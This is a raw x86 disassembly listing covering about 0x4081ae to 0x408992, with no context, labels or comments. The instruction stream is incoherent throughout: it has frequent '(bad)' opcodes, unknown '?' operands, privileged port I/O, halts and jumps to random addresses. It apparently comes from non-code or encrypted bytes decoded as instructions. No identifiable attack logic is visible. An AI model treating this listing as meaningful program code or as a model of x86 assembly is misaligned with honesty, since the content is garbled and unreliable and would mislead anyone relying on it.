  4081ae:	and    DWORD PTR [esi+ebx*4+0x56ac0251],esi
  4081b5:	sub    DWORD PTR [esi],edx
  4081b7:	fmul   st(2),st
  4081b9:	push   ebx
  4081ba:	outs   dx,DWORD PTR ds:[esi]
  4081bb:	ror    DWORD PTR [edx+esi*1-0x58],cl
  4081bf:	inc    ebx
  4081c0:	xor    DWORD PTR [ebp-0x8],esi
  4081c3:	(bad)  
  4081c4:	fadd   DWORD PTR [ebx+0x5e]
  4081c7:	cmp    DWORD PTR [ebp+0x3e],edi
  4081ca:	pop    edx
  4081cb:	aam    0xf
  4081cd:	ins    DWORD PTR es:[edi],dx
  4081ce:	inc    ebx
  4081cf:	xor    DWORD PTR [eax+0x9273d31],edi
  4081d5:	sub    DWORD PTR [ebp+0x13],ebp
  4081d8:	ja     0x408237
  4081da:	jno    0x4081b4
  4081dc:	xchg   DWORD PTR [esi],edx
  4081de:	sahf   
  4081df:	mov    edx,0xeb44f8cd
  4081e4:	in     eax,0x35
  4081e6:	sub    al,0x78
  4081e8:	mov    cl,0xac
  4081ea:	push   ebp
  4081eb:	mov    ch,0xd0
  4081ed:	sbb    al,BYTE PTR [ebx+0x67]
  4081f0:	adc    edi,ecx
  4081f2:	mov    DWORD PTR [ebp+0x73],0x58deccd
  4081f9:	test   BYTE PTR [edx+0x1717fe61],dh
  4081ff:	repz int 0x98
  408202:	dec    ecx
  408203:	mov    ecx,0x90604d66
  408208:	and    eax,0x2072ce22
  40820d:	jne    0x408276
  40820f:	mov    ds:0xfb7624af,eax
  408214:	fdivr  QWORD PTR [eax+0x3c5f9b50]
  40821a:	(bad)  
  40821b:	mov    ecx,0x9b462c8e
  408220:	xor    eax,0x24262955
  408225:	enter  0x98ce,0x67
  408229:	push   eax
  40822a:	lea    eax,[edx]
  40822c:	adc    ebp,DWORD PTR [eax+0x5380c27f]
  408232:	jecxz  0x40822e
  408234:	in     eax,dx
  408235:	addr16 pop ebp
  408237:	pop    eax
  408238:	cli    
  408239:	fst    DWORD PTR [eax-0x1fd2bff2]
  40823f:	mov    ah,0x1c
  408241:	jb     0x4081df
  408243:	ficom  WORD PTR [eax+eax*4-0x17491dee]
  40824a:	cmp    esi,DWORD PTR [esi-0x77]
  40824d:	jo     0x4081ea
  40824f:	loopne 0x4082c5
  408251:	ss out dx,eax
  408253:	dec    edi
  408254:	mov    ebp,0x922e7ec0
  408259:	fcomp  st(1)
  40825b:	and    esi,ecx
  40825d:	cmp    eax,0x113c03bc
  408262:	mov    ds:0x34cad6ee,eax
  408267:	or     eax,0xc43bec57
  40826c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40826d:	ja     0x40824a
  40826f:	inc    ebp
  408270:	mov    eax,0x8b326b43
  408275:	dec    esp
  408276:	dec    ebx
  408277:	pop    esp
  408278:	sahf   
  408279:	push   ds
  40827a:	(bad)  
  40827b:	(bad)  
  40827c:	cli    
  40827d:	sti    
  40827e:	leave  
  40827f:	pop    ecx
  408280:	jl     0x408291
  408282:	sbb    al,dh
  408284:	jp     0x40827d
  408286:	dec    ebp
  408287:	mov    al,ds:0xe2b8c085
  40828c:	nop    DWORD PTR [edi]
  40828f:	lods   al,BYTE PTR ds:[esi]
  408290:	xchg   ecx,eax
  408291:	mov    ebx,0x84d18d53
  408296:	mov    cl,0xef
  408298:	dec    esi
  408299:	rol    BYTE PTR [ebp-0x63863a62],0x8c
  4082a0:	pop    eax
  4082a1:	inc    esi
  4082a2:	(bad)  
  4082a3:	addr16 dec esi
  4082a5:	inc    edx
  4082a6:	shl    DWORD PTR [edx+0x7a4e9568],1
  4082ac:	push   eax
  4082ad:	cmp    bh,0xc3
  4082b0:	xchg   BYTE PTR [edx+ebx*2-0x42],bh
  4082b4:	inc    esi
  4082b5:	cmp    ebp,DWORD PTR [ebx]
  4082b7:	hlt    
  4082b8:	mov    al,ds:0xbd16fdb2
  4082bd:	mov    dh,0x1c
  4082bf:	or     DWORD PTR [ebx+ebx*8-0xbc90c],ebp
  4082c6:	ins    DWORD PTR es:[edi],dx
  4082c7:	xchg   esp,eax
  4082c8:	mov    eax,0xb2ed022b
  4082cd:	mov    ah,0xb9
  4082cf:	out    0xb0,al
  4082d1:	ret    0xb2f7
  4082d4:	xor    al,0x10
  4082d6:	adc    edx,DWORD PTR [ecx-0x74efd282]
  4082dc:	pcmpgtw mm1,mm5
  4082df:	sti    
  4082e0:	in     eax,0xf
  4082e2:	les    ebp,FWORD PTR [ecx-0x46]
  4082e5:	xor    BYTE PTR [edx],dl
  4082e7:	or     dh,BYTE PTR [ebx]
  4082e9:	out    dx,eax
  4082ea:	fsubr  st(0),st
  4082ec:	gs push ds
  4082ee:	mov    BYTE PTR [eax],bh
  4082f0:	xchg   ebp,eax
  4082f1:	cmp    esi,edi
  4082f3:	das    
  4082f4:	sar    edi,0xf9
  4082f7:	mov    WORD PTR [ebx-0x79a04386],?
  4082fd:	jle    0x408291
  4082ff:	rcr    eax,0x42
  408302:	jnp    0x4082a0
  408304:	test   bl,dl
  408306:	xor    eax,0x9e812572
  40830b:	mov    ds:0xe5600221,al
  408310:	push   esp
  408311:	scas   eax,DWORD PTR es:[edi]
  408312:	and    eax,0x65e0141c
  408317:	xor    eax,0x3320ba29
  40831c:	adc    al,0xed
  40831e:	fidiv  WORD PTR [eax]
  408320:	mov    dh,0xbb
  408322:	mov    ebx,0x427d8a7e
  408327:	fsubr  QWORD PTR [ecx+0x3f19c8a6]
  40832d:	rol    DWORD PTR [eax+0x72],0x67
  408331:	xlat   BYTE PTR ds:[ebx]
  408332:	mov    ?,esp
  408334:	shl    DWORD PTR [ebp+ebx*1-0x6e],1
  408338:	loope  0x408308
  40833a:	dec    edx
  40833b:	mov    eax,ds:0x3b6d0ea1
  408340:	push   ecx
  408341:	cmp    BYTE PTR ds:0x99678e21,cl
  408347:	mov    edx,0x899f0857
  40834c:	mov    esi,0x4907a974
  408351:	pop    eax
  408352:	add    bh,BYTE PTR [ebp+0x69]
  408355:	add    eax,0x19d3811e
  40835a:	repnz int3 
  40835c:	and    bl,BYTE PTR [esi]
  40835e:	call   esp
  408360:	imul   esi,DWORD PTR [eax+0xd3fea35],0x3a
  408367:	dec    eax
  408368:	push   ebx
  408369:	jl     0x4083ea
  40836b:	fs xchg edi,eax
  40836d:	push   eax
  40836e:	or     DWORD PTR [ecx+0x78],edi
  408371:	popf   
  408372:	dec    ebp
  408373:	out    dx,eax
  408374:	jp     0x408336
  408376:	mov    ds:0x3bf83396,al
  40837b:	loop   0x40835a
  40837d:	or     al,0xd4
  40837f:	jb     0x40838a
  408381:	mov    dh,0xb9
  408383:	mov    dl,0x6a
  408385:	lds    di,DWORD PTR [ebx+edx*4+0xb04680]
  40838d:	xchg   ebp,eax
  40838e:	sbb    eax,0xf6939626
  408393:	mov    bh,0x1
  408395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408396:	clc    
  408397:	inc    eax
  408398:	pop    ss
  408399:	pop    eax
  40839a:	clc    
  40839b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40839c:	sahf   
  40839d:	stos   DWORD PTR es:[edi],eax
  40839e:	and    DWORD PTR [ebp+edi*4-0x363e0de7],eax
  4083a5:	pop    eax
  4083a6:	gs scas eax,DWORD PTR es:[edi]
  4083a8:	shl    DWORD PTR [esi],1
  4083aa:	push   eax
  4083ab:	aam    0xcf
  4083ad:	and    dl,BYTE PTR [ebp+0x18fa329b]
  4083b3:	je     0x40841a
  4083b5:	jae    0x4083a9
  4083b7:	pop    ebp
  4083b8:	scas   al,BYTE PTR es:[edi]
  4083b9:	or     al,0x25
  4083bb:	and    eax,0xd2910ee3
  4083c0:	ret    
  4083c1:	mov    ch,0xdf
  4083c3:	shr    BYTE PTR [ebx+0xb],1
  4083c6:	jb     0x408406
  4083c8:	mov    dh,0x29
  4083ca:	jae    0x40836b
  4083cc:	xor    BYTE PTR [edx+0x7fe27146],cl
  4083d2:	mov    ds:0xa20c6348,eax
  4083d7:	mov    ds:0xf15ad1f,eax
  4083dc:	adc    eax,0x355d7add
  4083e1:	icebp  
  4083e2:	adc    BYTE PTR [edx-0x53],0x43
  4083e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083e7:	mov    dh,BYTE PTR [esi]
  4083e9:	push   edi
  4083ea:	xchg   ebp,eax
  4083eb:	xchg   edi,eax
  4083ec:	mov    WORD PTR fs:[edx],?
  4083ef:	mov    ds:0x64fc608e,al
  4083f4:	xchg   BYTE PTR [ecx-0x26],ah
  4083f7:	sub    al,bh
  4083f9:	mov    BYTE PTR [edi+0x44],0x4b
  4083fd:	jecxz  0x4083eb
  4083ff:	mov    eax,ds:0x3ad97519
  408404:	sub    ah,dh
  408406:	test   al,0x1b
  408408:	jns    0x40842f
  40840a:	cld    
  40840b:	popf   
  40840c:	and    al,0xf2
  40840e:	mov    ecx,0xb382cced
  408413:	or     al,BYTE PTR [ebx]
  408415:	outs   dx,BYTE PTR ds:[esi]
  408416:	add    eax,0x2d748966
  40841b:	scas   eax,DWORD PTR es:[edi]
  40841c:	and    al,0x70
  40841e:	add    BYTE PTR [esi],bh
  408420:	test   DWORD PTR [eax],0xe282191a
  408426:	icebp  
  408427:	stos   DWORD PTR es:[edi],eax
  408428:	popa   
  408429:	imul   DWORD PTR [ebx+0x7c]
  40842c:	mov    dh,0xb8
  40842e:	jmp    0x4083b0
  408430:	mov    WORD PTR [esi+0x4b2b73c4],?
  408436:	sbb    bh,BYTE PTR [eax]
  408438:	inc    esp
  408439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40843a:	add    al,BYTE PTR ds:0xeb683c05
  408440:	int    0x74
  408442:	dec    esi
  408443:	loop   0x40842f
  408445:	aaa    
  408446:	pop    ecx
  408447:	mov    esi,DWORD PTR [ebx+0x1c4b3bf3]
  40844d:	aam    0x89
  40844f:	fldcw  WORD PTR [ecx]
  408451:	dec    ebx
  408452:	frstor [ecx+0x69]
  408455:	adc    eax,0x5da40a6b
  40845a:	add    BYTE PTR [edx],dl
  40845c:	test   DWORD PTR [eax+edi*1-0x72],edx
  408460:	mov    ds:0x531c130c,eax
  408465:	mov    al,BYTE PTR [edi]
  408467:	or     eax,0x4a502619
  40846c:	mov    ch,0x79
  40846e:	cs (bad) 
  408470:	mov    dl,0x7a
  408472:	test   BYTE PTR [esi-0x677c72a2],ah
  408478:	xchg   DWORD PTR [ecx],edx
  40847a:	stc    
  40847b:	mov    ch,BYTE PTR [ebx+0x29ad9816]
  408481:	push   0xfffffffb
  408483:	xchg   edi,eax
  408484:	jecxz  0x40843f
  408486:	cmp    DWORD PTR [edx-0x38],esi
  408489:	mov    esi,0x1c0e2105
  40848e:	lahf   
  40848f:	pop    edx
  408490:	pop    esi
  408491:	mov    eax,ds:0xb0a28d5
  408496:	mov    edx,DWORD PTR [ebx+0x56]
  408499:	(bad)  [ebx-0x35]
  40849c:	xlat   BYTE PTR ds:[ebx]
  40849d:	jl     0x4084ba
  40849f:	fwait
  4084a0:	leave  
  4084a1:	mov    al,0x31
  4084a3:	push   ebp
  4084a4:	dec    ebx
  4084a5:	mov    DWORD PTR [ebx+0x5804622d],esp
  4084ab:	cmp    edx,DWORD PTR [edi-0x10]
  4084ae:	outs   dx,DWORD PTR ds:[esi]
  4084af:	and    edi,DWORD PTR [eax+0x6d]
  4084b2:	lea    edx,[ebp-0x6a6f764a]
  4084b8:	add    dl,ah
  4084ba:	push   0x5e
  4084bc:	out    dx,eax
  4084bd:	xchg   esi,eax
  4084be:	mov    ds:0xa0f3151a,al
  4084c3:	int    0x23
  4084c5:	and    eax,0xbc8c58bb
  4084ca:	gs xor al,0x62
  4084cd:	or     esp,DWORD PTR [ebp+eax*2+0x15]
  4084d1:	clc    
  4084d2:	sbb    ecx,DWORD PTR gs:[edi-0x4e]
  4084d6:	fwait
  4084d7:	stos   DWORD PTR es:[edi],eax
  4084d8:	fdivr  DWORD PTR [ecx]
  4084da:	iret   
  4084db:	cli    
  4084dc:	push   ebx
  4084dd:	sub    DWORD PTR [ebx],eax
  4084df:	test   DWORD PTR ds:0x283a11ef,ebx
  4084e5:	and    eax,0x150b98b3
  4084ea:	adc    DWORD PTR [edi+0x4b],ebx
  4084ed:	ret    0x6837
  4084f0:	xchg   DWORD PTR [ebx],edx
  4084f2:	fs pop esi
  4084f4:	and    eax,esp
  4084f6:	mov    ds:0xf84feb59,eax
  4084fb:	test   eax,0x6a92f0e8
  408500:	das    
  408501:	out    dx,eax
  408502:	pushf  
  408503:	mov    ebx,DWORD PTR [edx+ecx*2-0x78]
  408507:	div    DWORD PTR [edx+0x2e]
  40850a:	jge    0x4084f9
  40850c:	loopne 0x408558
  40850e:	fnstcw WORD PTR [esi-0x15b0cd58]
  408514:	mov    DWORD PTR [esp+ecx*1+0x3b],esp
  408518:	lods   al,BYTE PTR ds:[esi]
  408519:	scas   al,BYTE PTR es:[edi]
  40851a:	push   eax
  40851b:	jecxz  0x40853d
  40851d:	adc    eax,DWORD PTR [ebx-0x4e]
  408520:	and    DWORD PTR [esi+ecx*2+0x69],0x9
  408525:	inc    ecx
  408526:	mov    bh,0x93
  408528:	fs jo  0x40854a
  40852b:	jae    0x408530
  40852d:	add    DWORD PTR [ebp+0x53a859e5],esi
  408533:	pop    edi
  408534:	inc    eax
  408535:	daa    
  408536:	mov    eax,ds:0xe5cafab0
  40853b:	out    dx,eax
  40853c:	repz bound ebx,QWORD PTR [ebx+0x56782127]
  408543:	out    0x3d,al
  408545:	popf   
  408546:	pop    edx
  408547:	bound  ebp,QWORD PTR [ebx+edx*4]
  40854a:	fs dec ebp
  40854c:	cmp    ebp,eax
  40854e:	mov    ah,0x32
  408550:	dec    eax
  408551:	in     eax,dx
  408552:	sub    al,0x3a
  408554:	test   DWORD PTR [edi+0x51cd2d1f],0xed11be11
  40855e:	jno    0x408525
  408560:	mov    ss,WORD PTR [edx]
  408562:	push   ebx
  408563:	mov    al,ds:0x3fdf4bf2
  408569:	int    0x36
  40856b:	sub    eax,0xebdc7e91
  408570:	fldenv [edx+0x638effac]
  408576:	in     eax,0x7e
  408578:	loop   0x408554
  40857a:	jno    0x4085a0
  40857c:	pop    ecx
  40857d:	jae    0x408515
  40857f:	loope  0x408580
  408581:	pop    DWORD PTR [edi]
  408583:	mov    ebp,0xda4a8f3d
  408588:	ins    DWORD PTR es:[edi],dx
  408589:	xor    DWORD PTR [esi-0x56],0xffffff98
  40858d:	sub    ebx,DWORD PTR [edi+0x71]
  408590:	scas   al,BYTE PTR es:[edi]
  408591:	pop    es
  408592:	sar    DWORD PTR [edx],1
  408594:	pop    ecx
  408595:	in     al,dx
  408596:	pop    ebx
  408597:	push   esp
  408598:	call   DWORD PTR [ebx]
  40859a:	xchg   ecx,eax
  40859b:	das    
  40859c:	(bad)  
  40859d:	in     al,0xea
  40859f:	cmp    BYTE PTR [edi+0x44c69ddf],bl
  4085a5:	pop    edi
  4085a6:	repz dec si
  4085a9:	clc    
  4085aa:	push   ebx
  4085ab:	push   0x1
  4085ad:	ror    DWORD PTR [edx+eax*4],0xa4
  4085b1:	retf   0x413e
  4085b4:	fld    TBYTE PTR [esi-0x29]
  4085b7:	aam    0xa9
  4085b9:	add    DWORD PTR ds:0x40ba60c2,0x1b5b5197
  4085c3:	push   DWORD PTR [ebx+eax*8-0xb]
  4085c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085c8:	je     0x40856f
  4085ca:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4085cc:	dec    esp
  4085cd:	test   al,0x31
  4085cf:	loope  0x40863c
  4085d1:	jns    0x408598
  4085d3:	ja     0x408642
  4085d5:	out    dx,al
  4085d6:	test   al,0x9b
  4085d8:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  4085df:	mov    eax,DWORD PTR [ebp-0x4]
  4085e2:	jmp    0x40a991
  4085e7:	sbb    eax,0x84488431
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0x3
  4085f4:	dec    eax
  4085f5:	jmp    0x8359ffe1
  4085fa:	xor    ecx,0x60
  4085fd:	add    DWORD PTR [ebx+0x726e3089],0xfffffff4
  408604:	pop    ss
  408605:	push   esp
  408606:	jnp    0x4085e1
  408608:	sub    DWORD PTR [ebp+edx*1+0x48d48e9f],edi
  40860f:	mov    DWORD PTR [edi+0x72a1dd64],esp
  408615:	xor    eax,0xbdb89327
  40861a:	loop   0x40869a
  40861c:	xchg   esp,eax
  40861d:	repnz pop es
  40861f:	dec    ecx
  408620:	mov    ecx,0xc23a3c65
  408625:	inc    ecx
  408626:	jle    0x4085b2
  408628:	xchg   BYTE PTR [edi],dl
  40862a:	arpl   WORD PTR [ebx-0x58],bx
  40862d:	sahf   
  40862e:	dec    ebp
  40862f:	jle    0x4085c3
  408631:	jns    0x40865c
  408633:	mov    eax,0x27b006c5
  408638:	popa   
  408639:	mov    ss,WORD PTR [esi-0x18]
  40863c:	sub    al,BYTE PTR [ebx]
  40863e:	daa    
  40863f:	xor    DWORD PTR [ecx],0x3f
  408642:	jno    0x40869e
  408644:	int3   
  408645:	es push cs
  408647:	retf   0x1f2c
  40864a:	sti    
  40864b:	adc    eax,0xf8d6f378
  408650:	iret   
  408651:	xor    eax,0xa921da3c
  408656:	pusha  
  408657:	pushf  
  408658:	aad    0xd1
  40865a:	and    BYTE PTR [eax+0x5d],bh
  40865d:	mov    edi,DWORD PTR [ebp-0x26881f3b]
  408663:	inc    esp
  408664:	call   0xb757c562
  408669:	jge    0x40868b
  40866b:	adc    DWORD PTR [ebx+0x4f549678],esp
  408671:	sbb    dl,dh
  408673:	and    ch,bl
  408675:	xchg   esp,eax
  408676:	mov    ebp,0xcdc91b6a
  40867b:	xchg   edi,eax
  40867c:	jg     0x408699
  40867e:	and    bh,BYTE PTR [ecx+0x4047cb74]
  408684:	push   edi
  408685:	or     esp,DWORD PTR [eax]
  408687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408688:	jmp    WORD PTR [edi+0x3731befd]
  40868f:	dec    BYTE PTR ds:0x274b3124
  408695:	test   bh,0xfe
  408698:	mov    ds:0xb2b8c4da,eax
  40869d:	les    ecx,FWORD PTR [esi-0x3f]
  4086a0:	dec    edx
  4086a1:	fcmove st,st(6)
  4086a3:	(bad)  
  4086a5:	mov    ds:0x971b896,al
  4086aa:	or     esp,edx
  4086ac:	mov    ecx,0xc2136978
  4086b1:	or     esi,ebx
  4086b3:	inc    edi
  4086b4:	xor    BYTE PTR [edi+0x3f],dh
  4086b7:	inc    esi
  4086b8:	xor    bh,BYTE PTR [ebx]
  4086ba:	or     dh,BYTE PTR [ebx+0x60e3cfcf]
  4086c0:	test   BYTE PTR [ebx-0x7a],bh
  4086c3:	dec    edi
  4086c4:	dec    ebx
  4086c5:	jl     0x408741
  4086c7:	hlt    
  4086c8:	sub    esi,DWORD PTR [ebx+0x23b0cf7f]
  4086ce:	or     al,BYTE PTR [ebx-0x6387868f]
  4086d4:	push   ebx
  4086d5:	fcomp  QWORD PTR [esi]
  4086d7:	push   esp
  4086d8:	inc    edi
  4086d9:	xor    al,0xb2
  4086db:	stc    
  4086dc:	pop    eax
  4086dd:	fs ins BYTE PTR es:[edi],dx
  4086df:	iret   
  4086e0:	aas    
  4086e1:	out    0x98,al
  4086e3:	aas    
  4086e4:	aaa    
  4086e5:	leave  
  4086e6:	adc    edx,esi
  4086e8:	xor    DWORD PTR [ecx-0x7af2238a],edx
  4086ee:	jbe    0x4086d0
  4086f0:	mov    edi,0x6fb0c5f5
  4086f5:	rcr    DWORD PTR [edx],cl
  4086f7:	fstp   DWORD PTR [eax-0x222870c5]
  4086fd:	mov    cl,0xdc
  4086ff:	in     al,dx
  408700:	sub    dl,BYTE PTR [ebx]
  408702:	jle    0x4086bd
  408704:	test   BYTE PTR ds:[esi-0x2f4bfa4f],al
  40870b:	xchg   DWORD PTR [edi],eax
  40870d:	sbb    eax,esp
  40870f:	xchg   edi,eax
  408710:	dec    ebx
  408712:	cmp    DWORD PTR [edi+0x53],esi
  408715:	pop    ds
  408716:	mov    dl,0x1a
  408718:	push   edx
  408719:	pop    eax
  40871a:	pop    es
  40871b:	mov    ecx,0xface4be2
  408720:	inc    ecx
  408721:	mov    al,ds:0x2707c0b9
  408726:	sub    ebx,DWORD PTR [edx]
  408728:	mov    ebx,0x50f1770e
  40872d:	mov    ebx,0xe8891e7e
  408732:	out    dx,al
  408733:	cwde   
  408734:	loope  0x408772
  408736:	int    0x6f
  408738:	dec    eax
  408739:	into   
  40873a:	mov    al,ds:0x2ce4ac2c
  40873f:	push   esp
  408740:	sub    BYTE PTR [esi-0x5d],0x34
  408744:	(bad)  
  408745:	cld    
  408746:	push   ebp
  408747:	push   edx
  408748:	jp     0x408752
  40874a:	dec    ebx
  40874b:	imul   ecx,eax,0xcd3910d2
  408751:	test   eax,0x111c26de
  408756:	(bad)  
  408757:	mov    ebp,0xff126604
  40875c:	(bad)  
  40875d:	(bad)  
  40875e:	cld    
  40875f:	gs add al,0xa3
  408762:	pop    ss
  408763:	imul   ebp,DWORD PTR [edx],0x74
  408766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408767:	rcl    ch,0x71
  40876a:	mov    ?,esp
  40876c:	push   ds
  40876d:	dec    edx
  40876e:	cmp    dl,bh
  408770:	outs   dx,BYTE PTR ds:[esi]
  408771:	xor    DWORD PTR ss:[edx+0x37],edi
  408775:	jne    0x40878a
  408777:	test   eax,esp
  408779:	mov    eax,0x4266dec5
  40877e:	sbb    edi,0x4ba68a7c
  408784:	fdiv   QWORD PTR [ecx+edx*1-0x12]
  408788:	push   0x859c3188
  40878d:	mov    eax,0x2839831c
  408792:	enter  0xeefc,0x8a
  408796:	dec    edx
  408797:	ins    DWORD PTR es:[edi],dx
  408798:	nop
  408799:	popf   
  40879a:	es and BYTE PTR ds:[ebp+esi*1-0x4],ah
  4087a0:	push   esp
  4087a1:	daa    
  4087a2:	ror    eax,0x33
  4087a5:	xor    al,0x50
  4087a7:	dec    esi
  4087a8:	inc    ebp
  4087a9:	rcr    DWORD PTR [ebx-0x64],cl
  4087ac:	pop    ebp
  4087ad:	ret    
  4087ae:	sar    al,0xf6
  4087b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087b2:	xchg   DWORD PTR ds:0x6650eb37,edi
  4087b8:	js     0x40876c
  4087ba:	push   es
  4087bb:	enter  0xff52,0x8
  4087bf:	cmp    eax,0xa969198
  4087c4:	and    eax,0x8e882d8d
  4087c9:	sbb    edi,edi
  4087cb:	push   ds
  4087cc:	fsubr  QWORD PTR [esi]
  4087ce:	jb     0x40881c
  4087d0:	(bad)
  4087d3:	sbb    bl,BYTE PTR [edx]
  4087d5:	mov    esi,0x9845768d
  4087da:	outs   dx,BYTE PTR ds:[esi]
  4087db:	ficomp WORD PTR es:0x4ac411c9
  4087e2:	les    edx,FWORD PTR [eax]
  4087e4:	xchg   edx,eax
  4087e5:	dec    ebp
  4087e6:	je     0x4087e8
  4087e8:	aas    
  4087e9:	aad    0xf4
  4087eb:	and    bh,BYTE PTR [edi+0xb]
  4087ee:	or     BYTE PTR [ebp+0x14092288],al
  4087f4:	push   es
  4087f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087f6:	pop    eax
  4087f7:	cmp    DWORD PTR [ebx-0x75],esp
  4087fa:	jle    0x408833
  4087fc:	dec    edi
  4087fd:	popf   
  4087fe:	xor    eax,0x9b4576f
  408803:	inc    ebx
  408804:	cmp    DWORD PTR [ebp-0x78aadb0],ebp
  40880a:	ret    0xf52f
  40880d:	and    eax,0x10f838eb
  408812:	test   BYTE PTR [ecx+0x7e3fa597],al
  408818:	add    BYTE PTR [edx-0x637a40c3],ch
  40881e:	xchg   esp,eax
  40881f:	push   es
  408820:	rcl    DWORD PTR [ebx+0x8],cl
  408823:	and    eax,0x84861434
  408828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408829:	mov    eax,ds:0xfd665c8
  40882e:	aad    0x20
  408830:	ret    
  408831:	cmp    esi,DWORD PTR [ebx-0x61]
  408834:	(bad)  
  408835:	sahf   
  408836:	(bad)  
  408837:	pop    ss
  408838:	sub    BYTE PTR [eax],dl
  40883a:	icebp  
  40883b:	lock out dx,al
  40883d:	int    0x2e
  40883f:	leave  
  408840:	jno    0x40882d
  408842:	aaa    
  408843:	jne    0x40884a
  408845:	add    esi,ecx
  408847:	ds push es
  408849:	shl    DWORD PTR [ebx],0x2e
  40884c:	jnp    0x4087fc
  40884e:	pop    ecx
  40884f:	cmp    BYTE PTR [ebx+0x72],0x8
  408853:	mov    ebx,0x20888e83
  408858:	sub    eax,0x1f08710d
  40885d:	adc    BYTE PTR [edi-0x204b00d2],ah
  408863:	or     ah,BYTE PTR [edi+0x1301f144]
  408869:	fadd   DWORD PTR [eax]
  40886b:	sbb    DWORD PTR [esi],edx
  40886d:	mov    ah,0x9f
  40886f:	mov    esp,0x6d5c4674
  408874:	ror    DWORD PTR es:[ebp-0x14e4a985],1
  40887b:	jecxz  0x40883d
  40887d:	retf   
  40887e:	adc    DWORD PTR [ebx],esp
  408880:	or     eax,0xef5b0e2a
  408885:	dec    edi
  408886:	int3   
  408887:	jb     0x40882a
  408889:	xchg   edi,eax
  40888a:	(bad)  
  40888b:	icebp  
  40888c:	lods   al,BYTE PTR ds:[esi]
  40888d:	xchg   edx,eax
  40888e:	(bad)  
  40888f:	pop    esp
  408890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408891:	sub    dl,al
  408893:	cld    
  408894:	mov    DWORD PTR [edi+0x6a],edi
  408897:	ficom  WORD PTR [ebp-0x4c]
  40889a:	mov    al,0x2c
  40889c:	push   esi
  40889d:	cmp    ebp,ebp
  40889f:	(bad)  
  4088a0:	cmp    edi,ebx
  4088a2:	mov    DWORD PTR [edi-0x60],eax
  4088a5:	(bad)  
  4088a6:	ins    DWORD PTR es:[edi],dx
  4088a7:	popf   
  4088a8:	mov    ecx,0x779d6581
  4088ad:	dec    eax
  4088ae:	icebp  
  4088af:	mov    bl,0x7
  4088b1:	inc    edi
  4088b2:	adc    ebp,DWORD PTR [ecx+0x150a0241]
  4088b8:	add    al,0xa3
  4088ba:	out    0xc4,eax
  4088bc:	rcl    DWORD PTR [eax],0x3c
  4088bf:	sti    
  4088c0:	mov    DWORD PTR [edi-0x40cba4fe],edi
  4088c6:	add    DWORD PTR [ecx],edx
  4088c8:	cmp    ebx,edi
  4088ca:	loope  0x40892b
  4088cc:	scas   al,BYTE PTR es:[edi]
  4088cd:	popf   
  4088ce:	push   edi
  4088cf:	jmp    0x40889a
  4088d1:	and    al,0xb5
  4088d3:	fbld   TBYTE PTR [ecx-0x33]
  4088d6:	xchg   DWORD PTR [edi],ebx
  4088d8:	imul   ebp,DWORD PTR [ebp+esi*4+0x39],0x69
  4088dd:	jg     0x4088d7
  4088df:	loop   0x40886f
  4088e1:	in     eax,dx
  4088e2:	xor    eax,0xaf46d4d1
  4088e7:	pop    eax
  4088e8:	sbb    al,0x54
  4088ea:	jno    0x4088c7
  4088ec:	push   edi
  4088ed:	lea    ecx,[ebx-0x5b2171fe]
  4088f3:	rep ins BYTE PTR es:[edi],dx
  4088f5:	sub    BYTE PTR [ebp+0x4c],dl
  4088f8:	adc    bl,BYTE PTR [esi]
  4088fa:	sub    esi,DWORD PTR [ebx+0x7d]
  4088fd:	pop    ss
  4088fe:	add    edi,DWORD PTR [edi]
  408900:	jge    0x4088e3
  408902:	mov    ah,0xad
  408904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408905:	out    dx,eax
  408906:	call   0xec2fd74d
  40890b:	cmp    eax,0x369e065a
  408910:	jp     0x4088a2
  408912:	jo     0x4088d8
  408914:	aad    0x44
  408916:	retf   0xbc4d
  408919:	call   0x4f553cd1
  40891e:	sahf   
  40891f:	test   al,0xe
  408921:	cli    
  408922:	pop    ebx
  408923:	push   es
  408924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408925:	or     eax,edi
  408927:	and    dh,BYTE PTR [ebp+0x1d]
  40892a:	xchg   DWORD PTR [ebp-0x22489b60],edx
  408930:	stos   BYTE PTR es:[edi],al
  408931:	pop    esi
  408932:	cmp    ecx,DWORD PTR [esi]
  408934:	ret    
  408935:	push   ebx
  408936:	jns    0x40895c
  408938:	push   ebp
  408939:	jp     0x4088cc
  40893b:	adc    dh,BYTE PTR [esi-0x44]
  40893e:	inc    ebx
  40893f:	ret    0x7a15
  408942:	inc    esp
  408943:	fmul   st(2),st
  408945:	mov    DWORD PTR [ebx],ebx
  408947:	clc    
  408948:	enter  0x8a0f,0x28
  40894c:	pop    ss
  40894d:	push   0xa9a4737c
  408952:	ins    BYTE PTR es:[edi],dx
  408953:	imul   ebx,DWORD PTR [esi+0x18],0xdfb404e6
  40895a:	int3   
  40895b:	add    eax,0x6f47730e
  408960:	push   es
  408961:	ret    0x936c
  408964:	mov    edi,0xb69c607e
  408969:	mov    ss,eax
  40896b:	push   ss
  40896c:	or     ch,BYTE PTR gs:[ebx+ebp*8]
  408970:	mov    ch,0x2
  408972:	scas   al,BYTE PTR es:[edi]
  408973:	mov    al,ds:0xfb4a972c
  408978:	dec    esp
  408979:	mov    dl,0x83
  40897b:	dec    edi
  40897c:	pop    ds
  40897d:	in     al,dx
  40897e:	dec    esp
  40897f:	mov    ebp,0x1aef52fa
  408984:	or     dh,BYTE PTR [edi-0x2]
  408987:	sbb    ebx,DWORD PTR [ebx-0x1b]
  40898a:	xor    eax,0x43ace97c
  40898f:	xor    al,0x4d
  408991:	dec    ebx
  408992:	jns    0x408994
